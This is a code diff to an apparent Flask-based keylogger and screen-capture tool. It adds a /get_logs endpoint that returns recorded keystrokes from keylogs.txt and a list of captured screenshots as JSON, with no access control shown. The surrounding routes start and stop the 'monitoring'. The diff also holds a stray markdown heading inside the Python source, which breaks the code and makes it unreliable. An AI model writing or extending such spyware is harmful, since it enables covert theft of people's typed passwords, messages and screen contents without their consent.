@@ -184,6 +184,27 @@ def start_monitoring():
     return jsonify({'message': 'Monitoring started'}), 200
 
 
+@app.route('/get_logs', methods=['GET'])
+def get_logs():
+    try:
+        # Read keystrokes logs
+        keystrokes = []
+        keystrokes_file = os.path.join(LOG_FOLDER, "keylogs.txt")
+        if os.path.exists(keystrokes_file):
+            with open(keystrokes_file, "r") as file:
+                keystrokes = file.readlines()
+
+        # Get list of screenshots
+        screenshots = []
+        if os.path.exists(SCREENSHOT_FOLDER):
+            screenshots = os.listdir(SCREENSHOT_FOLDER)
+
+        return jsonify({"keystrokes": keystrokes, "screenshots": screenshots})
+
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+
 ### **🔴 Stop Monitoring API**
 @app.route('/stop_monitoring', methods=['POST'])
 def stop_monitoring():
